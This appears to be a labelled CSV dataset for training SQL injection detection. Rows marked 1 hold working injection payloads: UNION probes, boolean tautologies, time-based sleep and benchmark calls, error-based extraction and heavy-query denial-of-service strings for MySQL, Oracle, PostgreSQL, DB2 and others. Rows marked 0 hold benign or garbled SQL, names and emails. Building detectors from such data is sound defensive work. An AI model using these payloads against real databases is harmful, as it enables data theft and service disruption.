Sentence,Label
"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw",1
1%'   )    )    and 7160  =  7249--,1
joyan,0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",1
ruben,0
DELETE FROM tight,0
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,0
21468433a,0
emil,0
"  SELECT contrastID AS ID, silent AS fierce FROM heard",0
"-7395%"" order by 1--",1
-2817  )   where 1212  =  1212 or 3266  =  1102,1
SELECT period ( s )  FROM thought SELECT even FROM busy,0
desparpajo,0
"  SELECT bicycle AS lion, mood AS [toward]  FROM naturally",0
SELECT * FROM  ( SELECT list FROM difference ) ,0
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1
"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",1
8702700000000000,0
"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM syllable 3 SELECT * FROM crowd,0
"   SELECT tribe, why, cat FROM according WHERE plan  IS NULL",0
bateman@alojesuweb.in,0
SELECT * FROM burn WHERE race BETWEEN voyage09/01/1996paid AND secret15/31/1996goes,0
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'zovb' like 'zovb",1
"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",1
8151,0
SELECT * FROM stepped WHERE broken BETWEEN '1996-07-01' AND '1996-07-31',0
1'  )   as chla where 6098  =  6098,1
SELECT AVG ( happen ) FROM unusual,0
SELECT AVG ( song ) FROM brown SELECT SUM ( better ) ,0
langellotti,0
"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
"-5755"" or 3581  =  7566",1
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
SELECT fought ( s )  FROM planned,0
c/ auroros 173,0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",1
SELECT COUNT ( seen ) FROM play,0
"  SELECT * FROM higher WHERE available NOT IN  ( 'work', 'turn', 'plan' )  ",0
"1'||  (  select 'epjr' from dual where 3074  =  3074 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
-7453'   )    )     )   or 8571  =  8571--,1
"1 where 1992  =  1992 union all select null,null--",1
"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",1
SELECT * FROM load WHERE living  BETWEEN 10 AND 20,0
SELECT * FROM differ WHERE blanket = 'bet',0
sarmiento,0
79274775p,0
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",1
"-1203""   )    )    or 8571  =  8571--",1
SELECT * FROM bag,0
sedero,0
"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM happen WHERE golden = 'worth'  AND  ( tight = 'carefully' OR wide = 'sheet' ) ,0
andrease,0
SELECT * FROM production,0
saint-simon-vondis@paremoselalzheimer.dj,0
"1' where 4245  =  4245 union all select null,null--",1
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
strock,0
"   SELECT Employees.deer, COUNT ( Orders.villageID )  AS peaceFROM    ( OrdersINNER JOIN hello ON Orders.dinnerID  =  Employees.sickID ) ",0
SELECT everything ( s )  FROM industry SELECT street ( s ) ,0
"1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  2303  =  2303",1
 UPDATE evening SET describe = 'song'WHERE section = 'whenever',0
santo,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
96to3a38,0
-5116  )   or   (  8287  =  4930  )  *4930,1
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""owzc"" like ""owzc",1
"  (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
6085,0
SELECT * FROM farther WHERE that = 'gradually' LIMIT 3,0
brendel@esposo.com.lk,0
SELECT dark ( s )  FROM read SELECT charge FROM cabin,0
1  )   where 1487  =  1487,1
SELECT * FROM act WHERE believed = 'judge'  OR come = 'rose',0
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT * FROM band FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM black,0
1   )    )    as vryv where 5600  =  5600,1
"-4419%""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,0
"-6548%""  )   union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",1
""" """,1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
kavaler,0
SELECT AVG ( harbor ) FROM slipped SELECT SUM ( brush ) ,0
"1""   )    )    as jrld where 3488  =  3488",1
SELECT * FROM brain WHERE gasoline = 'who',0
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1
2252,0
campanini-adamson@barebackspain.kh,0
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
servitje areggiani,0
"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1
SELECT period ( s )  FROM allow FULL OUTER JOIN,0
SELECT * FROM bank  WHERE riding NOT LIKE '[chair]%',0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",1
6343510000000000,0
30599008s,0
SELECT * FROM practice  WHERE pipe = certainly,0
"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",1
"1   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  3023  =  3023",1
"pl. curro cuchares, 72,",0
SELECT * FROM saved WHERE satellites = 'evening' FETCH FIRST 3 ROWS ONLY,0
" SELECT column_name ( s )  FROM swung,uncle",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",1
hache6,0
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
legarreta sant,0
"-5560""   )    )    or 7292  =  6184#",1
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT * FROM per WHERE paid NOT LIKE 'ants%',0
28194,0
SELECT * FROM rubber WHERE twenty = 'wheat',0
prueckner@helicopter.com.gf,0
5798580000000000,0
"   SELECT COUNT ( conversation ) , under FROM anything BY seen",0
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",1
8730000000000000,0
1'||  (  select 'lzzr' where 2477  =  2477,1
"-4955%' union all select 5928,5928--",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367657 ) ,0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"1   )    )    union all select null,null,null,null--",1
SELECT AVG ( till ) FROM practical,0
SELECT AVG ( alone ) FROM sea,0
SELECT TOP 3 * FROM jungle WHERE plan = 'stiff' SELECT * FROM positive,0
SELECT AVG ( Price ) FROM fair,0
SELECT offer ( s FROM salmon RIGHT JOIN,0
solar,0
SELECT system ( s )  FROM dirt SELECT whose FROM pictured,0
"INSERT INTO we  ( parts, held, gasoline )  VALUES  ( 'diameter', 'police', 'doll' )  ",0
SELECT * FROM serious 3 SELECT * FROM similar,0
1'  )   where 3588  =  3588,1
SELECT * FROM adjective WHERE largest = 'vowel' LIMIT 3,0
SELECT safe,0
SELECT AVG ( truth )  FROM slope  SELECT SUM ( fully ) ,0
SELECT * FROM should WHERE thread IN  ( SELECT forty FROM have ) ,0
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1
1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
SELECT TOP 3 * FROM nervous SELECT * FROM screen 3SELECT * FROM aware,0
"   SELECT final,new,key,manufacturing,happy     (  (  he JOIN potatoes ON process.no =  community.central )   INNER JOIN stoppedON Orders.pale =  mixture.highestID ) ",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",1
SELECT giving ( s )  FROM this UNION,0
"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
1'+  (  select xwcl where 7997  =  7997,1
"INSERT INTO truck ( laid, map, divide, unknown, trail, blood )  VALUES  ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )  ",0
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",1
combee,0
SELECT * FROM either WHERE shinning = 'up'  OR ear = 'metal',0
SELECT AVG ( ourselves ) FROM bottle SELECT SUM ( back ) ,0
SELECT AVG ( lift ) FROM page SELECT SUM ( mark ) ,0
"-9265""  )   or 7834  =  1685",1
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",1
"-2314%'   )    )    union all select 4612,4612--",1
lecompte,0
1  )   as ztrb where 1052  =  1052 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
95549133a,0
09831514a,0
select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',1
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'ujds'  =  'ujds,1
"  SELECT wet,captured,say FROM settlers LEFT JOIN Orders ON letter.buyID =  perfectly.nearer ORDER BY blind.rhythm",0
ellacott2,0
SELECT column_name ( s ) FROM table1RIGHT JOIN,0
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
SELECT TOP 50 PERCENT * FROM butter SELECT * FROM tribe FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM please,0
"  SELECT MAKEDATE ( 2017, 100 ) ;",0
lubna,0
1  )   where 9552  =  9552 and 1961  =  6333--,1
"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",1
SELECT * FROM mighty WHERE NOT guard = 'distance'  AND NOT far = 'government',0
SELECT * FROM chest 3 SELECT * FROM definition,0
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch,0
"  SELECT roof,glass,tomorrow FROM he LEFT JOIN Orders ON plates.familiarID =  life.ate ORDER BY enter.composed",0
select pg_sleep  (  5   )    )   ||',1
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'qvrd'  =  'qvrd",1
"puerta del sol 124, 8?h",0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",1
mattos@velazquezlarraaga.dd,0
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1
7670000000000000,0
13061311w,0
SELECT DISTINCT belt FROM class,0
93254282t,0
"1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
acr7m6nia,0
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
SELECT * FROM hung WHERE that = 'immediately'  OR find = 'search',0
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1
SELECT * FROM spent WHERE least = 'active' LIMIT 3,0
SELECT * FROM torn WHERE feathers = 'count'  OR today = 'rule',0
"1' and elt  (  4249  =  4249,7259  )   and 'nsbj' like 'nsbj",1
" SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NOT NULL;",0
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1
"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM although WHERE manner BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT saddle AS closer, promised AS [mind]  FROM fireplace",0
"  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",0
SELECT * FROM hello FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( angle ) FROM lunch SELECT SUM ( trade ) ,0
"  SELECT seedID AS ID, classroom AS sport FROM include",0
busqu,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",1
10262643c,0
SELECT * FROM expect WHERE chose IN  ( SELECT unit FROM merely ) ,0
moua,0
"-4929"" where 6381  =  6381 or 8571  =  8571--",1
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1
os,1
select   (  case when   (  7217  =  7631  )   then 7217 else 7217*  (  select 7217 from information_schema.character_sets  )   end  )  #,1
SELECT buy ( s )  FROM call UNION,0
"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
17621392b,0
"-8868""  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1
select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM upward WHERE each NOT LIKE 'moving%',0
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
"  SELECT REVERSE ( ""SQL Tutorial"" ) ;",0
SELECT * FROM breathing FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT entire,0
SELECT * FROM ourselves,0
SELECT enemy ( s )  FROM beside LEFT JOIN,0
1'||  (  select 'boib' where 9595  =  9595,1
